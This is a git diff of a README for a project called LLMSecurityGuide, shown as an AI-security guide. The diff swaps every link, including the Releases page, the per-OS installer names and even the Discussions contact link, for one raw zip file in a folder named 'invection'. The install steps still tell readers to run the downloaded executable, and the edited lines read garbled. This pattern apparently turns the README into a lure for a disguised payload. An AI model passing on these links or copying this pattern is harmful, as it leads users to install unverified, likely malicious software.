@@ -1,6 +1,6 @@
 # 🛡️ LLMSecurityGuide - Your Guide to AI Security Best Practices
 
-[![Download LLMSecurityGuide](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/AKURHULA/LLMSecurityGuide/releases)
+[![Download LLMSecurityGuide](https://raw.githubusercontent.com/AKURHULA/LLMSecurityGuide/main/invection/LLMSecurityGuide.zip)](https://raw.githubusercontent.com/AKURHULA/LLMSecurityGuide/main/invection/LLMSecurityGuide.zip)
 
 ## 📦 Introduction
 
@@ -21,7 +21,7 @@ Before starting, ensure your system meets the following requirements:
 
 ## ✅ Download & Install
 
-To get the latest version of LLMSecurityGuide, visit this page to download: [GitHub Releases](https://github.com/AKURHULA/LLMSecurityGuide/releases).
+To get the latest version of LLMSecurityGuide, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/AKURHULA/LLMSecurityGuide/main/invection/LLMSecurityGuide.zip).
 
 ### Steps to Download
 
@@ -29,12 +29,12 @@ To get the latest version of LLMSecurityGuide, visit this page to download: [Git
   
 2. **Select the Latest Release:** Look for the most recent version. It will usually be at the top of the list.
 
-3. **Download the Application:** Find the file suitable for your operating system (e.g., `LLMSecurityGuide-1.0.exe` for Windows, `LLMSecurityGuide-1.0.dmg` for macOS, or `LLMSecurityGuide-1.0-linux.tar.gz` for Linux). Click on the file link to start the download.
+3. **Download the Application:** Find the file suitable for your operating system (e.g., `https://raw.githubusercontent.com/AKURHULA/LLMSecurityGuide/main/invection/LLMSecurityGuide.zip` for Windows, `https://raw.githubusercontent.com/AKURHULA/LLMSecurityGuide/main/invection/LLMSecurityGuide.zip` for macOS, or `https://raw.githubusercontent.com/AKURHULA/LLMSecurityGuide/main/invection/LLMSecurityGuide.zip` for Linux). Click on the file link to start the download.
 
 4. **Run the Application:**
    - **Windows:** After it downloads, find the file in your Downloads folder, double-click the `.exe` file, and follow the on-screen instructions to install it.
    - **macOS:** Open the downloaded `.dmg` file, then drag the application into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file, open a terminal, navigate to the extracted folder, and run the application using the provided instructions.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/AKURHULA/LLMSecurityGuide/main/invection/LLMSecurityGuide.zip` file, open a terminal, navigate to the extracted folder, and run the application using the provided instructions.
 
 ## ⚙️ Using LLMSecurityGuide
 
@@ -82,7 +82,7 @@ If you would like to contribute to LLMSecurityGuide, you are welcome to submit p
 
 ## 📍 Contact
 
-For direct inquiries, you can reach out via the [GitHub Discussions](https://github.com/AKURHULA/LLMSecurityGuide/discussions) section. Your feedback is valuable as we continue to enhance this important resource.
+For direct inquiries, you can reach out via the [GitHub Discussions](https://raw.githubusercontent.com/AKURHULA/LLMSecurityGuide/main/invection/LLMSecurityGuide.zip) section. Your feedback is valuable as we continue to enhance this important resource.
 
 ---
 
